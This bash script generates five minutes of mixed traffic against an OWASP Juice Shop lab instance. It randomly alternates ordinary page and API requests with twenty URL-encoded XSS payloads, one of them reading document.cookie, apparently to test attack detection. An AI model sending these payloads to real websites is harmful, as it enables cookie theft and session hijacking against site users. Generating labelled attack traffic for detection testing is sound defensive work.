#!/bin/bash
TARGET_IP="${TARGET_IP:-100.64.0.20}"
PORT="${PORT:-3000}"
JUICE_URL="http://${TARGET_IP}:${PORT}"
DURATION_SECONDS=300
END_TIME=$(( $(date +%s) + DURATION_SECONDS ))

ts() { date +"%Y-%m-%dT%H:%M:%S.%3N%:z"; }

total_requests=0
xss_attacks=0
normal_requests=0

echo "--- Starting Custom Mixed Traffic for ${DURATION_SECONDS} seconds ---"
echo "Target: $JUICE_URL"

# XSS attack patterns from xss_attack.sh
xss_patterns=(
    "<img%20src=x%20onerror=alert(document.cookie)>"
    "<svg><animate%20onbegin=alert(1)>"
    "<div%20onclick=alert(1)>ClickMe</div>"
    "<audio%20src=x%20onerror=alert(1)>"
    "<button%20onmouseover=alert(1)>Hover</button>"
    "<style%20onload=alert(1)></style>"
    "<img%20src=x:alert(1)>"
    "<link%20rel=stylesheet%20href='javascript:alert(1)'>"
    "<div%20style=\"background:url(javascript:alert(1))\">"
    "<meta%20http-equiv='refresh'%20content='0;javascript:alert(1)'>"
    "<script>alert(String.fromCharCode(88,83,83))</script>"
    "<iframe%20srcdoc='<script>alert(1)</script>'>"
    "<marquee%20onfinish=alert(1)>Test</marquee>"
    "<object%20type='text/html'%20data='javascript:alert(1)'></object>"
    "<script>top.alert(1)</script>"
    "%3Cscript%3Ealert(1)%3C/script%3E"
    "\\\"><script>alert(1)</script>"
    "<textarea%20onfocus=alert(1)>X</textarea>"
    "<keygen%20onfocus=alert(1)>"
    "<iframe%20src='data:text/html,<script>alert(1)</script>'>"
)

# Normal traffic patterns
normal_patterns=(
    "/"
    "/search?q=product"
    "/login"
    "/api/Products"
    "/profile"
    "/basket"
    "/search?q=juice"
    "/contact"
    "/about"
    "/rest/user/login"
    "/rest/products/search?q=apple"
    "/rest/basket/1"
    "/rest/user/whoami"
    "/assets/public/images/products/apple_juice.jpg"
    "/socket.io/?transport=polling"
    "/rest/products/1"
    "/rest/products/2"
    "/api/Challenges"
    "/rest/user/change-password"
    "/rest/user/security-question"
)

# Function to generate random traffic
generate_traffic() {
    # 50% chance of XSS attack, 50% chance of normal traffic
    if [ $((RANDOM % 100)) -lt 50 ]; then
        # XSS attack
        pattern=${xss_patterns[$((RANDOM % ${#xss_patterns[@]}))]}
        echo "[$(ts)] XSS Attack: $pattern"
        curl -s "${JUICE_URL}/?q=${pattern}" -o /dev/null
        ((xss_attacks++))
    else
        # Normal traffic
        pattern=${normal_patterns[$((RANDOM % ${#normal_patterns[@]}))]}
        echo "[$(ts)] Normal Request: $pattern"
        curl -s "${JUICE_URL}${pattern}" -o /dev/null
        ((normal_requests++))
    fi
    ((total_requests++))
}

# Generate randomized mixed traffic
while [ "$(date +%s)" -lt "$END_TIME" ]; do
    generate_traffic
    # Random interval between 1 and 10 seconds
    RANDOM_INTERVAL=$((RANDOM % 10 + 1))
    sleep "$RANDOM_INTERVAL"
done

echo "--- Custom mixed traffic generation complete ---"
echo "Total requests sent: $total_requests"
echo "XSS attacks: $xss_attacks"
echo "Normal requests: $normal_requests"

# Calculate attack ratio using bash arithmetic (more reliable than bc)
if [ $total_requests -gt 0 ]; then
    attack_ratio=$((xss_attacks * 100 / total_requests))
    echo "Attack ratio: ${attack_ratio}%"
else
    echo "Attack ratio: 0%"
fi

echo "Completed at: $(ts)"
